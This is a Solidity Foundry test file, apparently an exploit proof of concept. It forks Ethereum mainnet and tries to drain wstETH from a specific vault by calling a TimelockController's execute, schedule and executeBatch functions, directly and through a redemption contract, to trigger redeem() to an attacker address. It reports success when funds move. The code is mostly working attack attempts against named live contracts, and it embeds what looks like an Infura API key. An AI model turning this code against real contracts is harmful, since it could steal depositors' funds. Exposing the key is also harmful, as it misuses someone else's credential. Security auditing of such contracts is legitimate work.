// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ITimelockController {
    function schedule(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) external;

    function execute(
        address target,
        uint256 value,
        bytes calldata payload,
        bytes32 predecessor,
        bytes32 salt
    ) external payable;

    function executeBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata payloads,
        bytes32 predecessor,
        bytes32 salt
    ) external payable;

    function getMinDelay() external view returns (uint256);
    function hasRole(bytes32 role, address account) external view returns (bool);
    function PROPOSER_ROLE() external view returns (bytes32);
    function EXECUTOR_ROLE() external view returns (bytes32);
}

contract TimelockExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeTimelock() public view {
        console.log("=== ANALYZING TIMELOCK ===\n");

        ITimelockController timelock = ITimelockController(TIMELOCK);

        console.log("Timelock address:", TIMELOCK);

        // Get min delay
        try timelock.getMinDelay() returns (uint256 delay) {
            console.log("Min delay:", delay);
            console.log("Min delay (days):", delay / 86400);
        } catch {
            console.log("getMinDelay() failed");
        }

        // Check common roles
        bytes32 proposerRole = keccak256("PROPOSER_ROLE");
        bytes32 executorRole = keccak256("EXECUTOR_ROLE");
        bytes32 cancellerRole = keccak256("CANCELLER_ROLE");
        bytes32 adminRole = bytes32(0); // DEFAULT_ADMIN_ROLE

        console.log("\nChecking if attacker has roles:");
        console.log("PROPOSER_ROLE:", timelock.hasRole(proposerRole, attacker));
        console.log("EXECUTOR_ROLE:", timelock.hasRole(executorRole, attacker));
        console.log("CANCELLER_ROLE:", timelock.hasRole(cancellerRole, attacker));
        console.log("ADMIN_ROLE:", timelock.hasRole(adminRole, attacker));

        // Check if anyone (address(0)) can execute
        console.log("\nChecking if anyone can execute:");
        console.log("EXECUTOR_ROLE for 0x0:", timelock.hasRole(executorRole, address(0)));

        // Check storage
        console.log("\nTimelock storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(TIMELOCK, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_TryTimelockExecute() public {
        console.log("=== TRYING TIMELOCK EXECUTE ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // If we can call Timelock.execute with REDEMPTION_0 as target,
        // and pass RC.redeem calldata...

        bytes memory rcRedeemCall = abi.encodeWithSignature(
            "redeem(uint256,address)",
            500e18,
            attacker
        );

        vm.startPrank(attacker);

        console.log("Trying Timelock.execute on REDEMPTION_CONTROLLER:");
        (bool s1,) = TIMELOCK.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes,bytes32,bytes32)",
                REDEMPTION_CONTROLLER,
                0,
                rcRedeemCall,
                bytes32(0),
                bytes32(0)
            )
        );
        console.log("  Success:", s1);

        // Try making REDEMPTION_0 call RC.redeem via timelock
        console.log("\nTrying to schedule+execute via Timelock:");

        // First try to schedule
        (bool s2,) = TIMELOCK.call(
            abi.encodeWithSignature(
                "schedule(address,uint256,bytes,bytes32,bytes32,uint256)",
                REDEMPTION_CONTROLLER,
                0,
                rcRedeemCall,
                bytes32(0),
                bytes32(uint256(1)), // salt
                0 // delay
            )
        );
        console.log("  Schedule success:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** TIMELOCK EXPLOIT WORKED! ***");
        }
    }

    function test_CheckTimelockRoleHolders() public view {
        console.log("=== CHECKING TIMELOCK ROLE HOLDERS ===\n");

        // AccessControl stores role data at:
        // keccak256(role . member . slot)

        bytes32 proposerRole = keccak256("PROPOSER_ROLE");
        bytes32 executorRole = keccak256("EXECUTOR_ROLE");

        // Check common addresses
        address[] memory addrs = new address[](6);
        addrs[0] = REDEMPTION_0;
        addrs[1] = REDEMPTION_1;
        addrs[2] = REDEMPTION_CONTROLLER;
        addrs[3] = VAULT;
        addrs[4] = TIMELOCK;
        addrs[5] = address(0); // Open execution

        string[6] memory names = ["REDEMPTION_0", "REDEMPTION_1", "RC", "VAULT", "TIMELOCK", "address(0)"];

        ITimelockController timelock = ITimelockController(TIMELOCK);

        console.log("PROPOSER_ROLE holders:");
        for (uint i = 0; i < addrs.length; i++) {
            bool has = timelock.hasRole(proposerRole, addrs[i]);
            if (has) {
                console.log("  ", names[i]);
            }
        }

        console.log("\nEXECUTOR_ROLE holders:");
        for (uint i = 0; i < addrs.length; i++) {
            bool has = timelock.hasRole(executorRole, addrs[i]);
            if (has) {
                console.log("  ", names[i]);
            }
        }
    }

    function test_TryViaRedemption1DelegatecallToTimelock() public {
        console.log("=== TRYING DELEGATECALL TO TIMELOCK VIA REDEMPTION_1 ===\n");

        // If REDEMPTION_1 can delegatecall to Timelock (which is at slot 0),
        // and Timelock's execute function would work in REDEMPTION_1's context...

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try calling Timelock's execute through REDEMPTION_1
        bytes memory rcRedeemCall = abi.encodeWithSignature(
            "redeem(uint256,address)",
            500e18,
            attacker
        );

        console.log("Trying execute() via REDEMPTION_1:");
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes,bytes32,bytes32)",
                REDEMPTION_CONTROLLER,
                0,
                rcRedeemCall,
                bytes32(0),
                bytes32(0)
            )
        );
        console.log("  Success:", s1);

        // Try executeBatch
        console.log("\nTrying executeBatch() via REDEMPTION_1:");

        address[] memory targets = new address[](1);
        targets[0] = REDEMPTION_CONTROLLER;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory payloads = new bytes[](1);
        payloads[0] = rcRedeemCall;

        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSignature(
                "executeBatch(address[],uint256[],bytes[],bytes32,bytes32)",
                targets,
                values,
                payloads,
                bytes32(0),
                bytes32(0)
            )
        );
        console.log("  Success:", s2);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 0) {
            console.log("\n*** DELEGATECALL TO TIMELOCK EXPLOIT WORKED! ***");
        }
    }

    function test_CheckTimelockFunctionSignatures() public pure {
        console.log("=== TIMELOCK FUNCTION SIGNATURES ===\n");

        console.log("schedule(address,uint256,bytes,bytes32,bytes32,uint256):");
        console.logBytes4(bytes4(keccak256("schedule(address,uint256,bytes,bytes32,bytes32,uint256)")));

        console.log("\nexecute(address,uint256,bytes,bytes32,bytes32):");
        console.logBytes4(bytes4(keccak256("execute(address,uint256,bytes,bytes32,bytes32)")));

        console.log("\nexecuteBatch(address[],uint256[],bytes[],bytes32,bytes32):");
        console.logBytes4(bytes4(keccak256("executeBatch(address[],uint256[],bytes[],bytes32,bytes32)")));

        console.log("\nhasRole(bytes32,address):");
        console.logBytes4(bytes4(keccak256("hasRole(bytes32,address)")));

        console.log("\ngrantRole(bytes32,address):");
        console.logBytes4(bytes4(keccak256("grantRole(bytes32,address)")));

        console.log("\ngetMinDelay():");
        console.logBytes4(bytes4(keccak256("getMinDelay()")));
    }
}
